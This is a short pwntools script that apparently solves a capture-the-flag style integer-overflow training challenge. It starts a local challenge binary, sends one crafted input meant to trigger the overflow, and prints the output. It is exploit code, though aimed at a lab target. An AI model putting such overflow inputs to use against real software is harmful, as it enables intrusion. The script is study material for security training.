from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

key1 = b'ffffffffffffffff\n81'

io = process('/challenge/integer-overflow-level2.0')

io.sendlineafter("Give me your input\n", key1)

while True:
    io.recvline()